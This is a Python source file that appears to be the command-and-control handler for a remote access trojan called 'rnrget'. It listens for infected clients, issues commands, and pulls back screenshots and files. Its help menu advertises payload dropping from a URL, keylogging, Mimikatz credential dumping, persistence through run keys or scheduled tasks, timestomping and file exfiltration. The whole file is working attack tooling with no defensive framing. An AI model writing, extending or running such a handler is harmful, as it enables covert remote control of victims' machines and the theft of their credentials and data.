#!/usr/bin/python3

import socket
import os
import datetime
import sys

def download_file(file_path, client_socket):
	try:
		data = b''
		while True:
			p = client_socket.recv(4096)
			data += p
			if len(p) < 4096:
				break
		f = open(file_path,'wb')
		f.write(data)
		f.close()
		return True
	except:
		return False

def get_reply(client_socket):
	data = b''
	while True:
		p = client_socket.recv(4096)
		data += p
		if len(p) < 4096:
			break
	return((data).decode('utf-8'))

def parse_cmd(server_socket):
	client_socket, address = server_socket.accept()
	print("[+] new rnrclient: " + str(address))
	while True:	
		try:
			cmd = input("$rnrget> ")
			args = cmd.split()
			print(str(args))
			if(cmd == 'quit' or cmd == 'q' or cmd == 'exit'):
				client_socket.send("exit".encode())
				client_socket.close()
				address.close()
				sys.exit()
				break
			elif(cmd == '?' or cmd == '/?' or cmd == 'help' or cmd == '-h'):
				menu()
			elif(cmd == 'clear' or cmd == 'cls'):
				os.system('clear')
			elif(cmd == 'screencap'):
				client_socket.send(cmd.encode())
				dt = str(datetime.datetime.now())
				filename = dt + '.jpg'
				if download_file(filename, client_socket) == True:
					print("[+] Operation Complete: screencap has been saved in handler directory as " + filename)
				else:
					print('[-] Failed to Download Screencap!')
			elif(args[0] == "getfile"):
				client_socket.send((args[0] + ' ' + args[1]).encode())
				if (download_file(args[2], client_socket)) == True:
					print("[+] Operation Complete: " + args[2] + " has been saved in handler directory")
				else:
					print('[-] Failed to Download ' + args[1])
			elif(args[0] == "arch"):
				if len(args) < 3:
					print("[+] arch requires source and destination path")
				else:
					client_socket.send(cmd.encode())
					print(get_reply(client_socket))
			else:
				client_socket.send(cmd.encode())
				print(get_reply(client_socket))
		except:
			print('[-] Command Failed!')

def main():
	server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#server_socket.bind(("10.0.0.1", 9999))
	server_socket.bind(("172.16.80.129",9999))
	server_socket.listen(5)
	art()
	menu()
	print("\n[+] Listening for rnrclients on port 9999....")
	parse_cmd(server_socket)

def menu():
        print("Command      Description                 Format");
        print("-------      -----------                 ------");
        print("help         display help menu           help, /?, ?");
        print("arch         create zip file from dir    arch <source path> <destination path>, arch C:\\Users\\srcdir C:\\Users\\dest.zip");
        print("cp           copy files                  cp <source path> <destination path>, cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
        print("del          delete files                del <target path>, del C:\\Users\\Admin\\targetfile.txt");
        print("deldir       delete directory            deldir <target path>, deldir C:\\Users\\Admin\\Directory");
        print("drop         drop payloads               drop <path> <URI>, dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
        print("envar        get environmental vars      envar");
        print("listdir      enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
        print("getfile      grab files                  getfile <target path> <local download path>, getfile C:\\Users\\Admin\\passwords.txt /usr/root/Desktop/passwords.txt");
        print("grep         case sensisitive grep       grep <pattern> <path>, grep foo bar.txt");
        print("hostinfo     get host information        hostinfo");
        print("keylog       log key strokes             keylog");
        print("mimi         invoke-mimikatz             mimi");
        print("mv           move files                  mv <source> <destination>, mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
        print("mkdir        create directory            mkdir <target dir>, mkdir C:\\Users\\Admin\\NewDir");
        print("persist      add run key         		persist logonscript or startup or schtask");
        print("ps           get process listing         ps");
        print("pwd          print working directory     pwd");
        print("cat          read text from file         cat <target path>, cat C:\\Users\\Admin\\helloworld.txt");
        print("run          run processes               run <target path>, run calc.exe");
        print("runadmin     run processes as admin      runadmin <target path>, runadmin calc.exe");
        print("screencap    take screenshot             screencap <save path>, screencap C:\\Users\\REM\\Desktop\\screencap.bmp");
        print("shares       enumerate shares            shares");
        print("ts           timestomp                   ts <target path>, ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
        print("userinfo     get user information        userinfo");
        print("xfil         exfil files                 xfil <target path> <URI>, xfil C:\\Users\\Admin\\xfil.me, https://raw.githubusercontent.com/rnranalysis/xfiol.file")


def art():
    print("                                                     __     ");
    print("                                                    /  |    ");
    print("  ______   _______    ______    ______    ______   _$$ |_   ");
    print(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
    print("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
    print("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
    print("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
    print("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
    print("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
    print("                              /  \\__$$ |                    ");
    print("                              $$    $$/                     ");
    print("                               $$$$$$/                      ");

main()


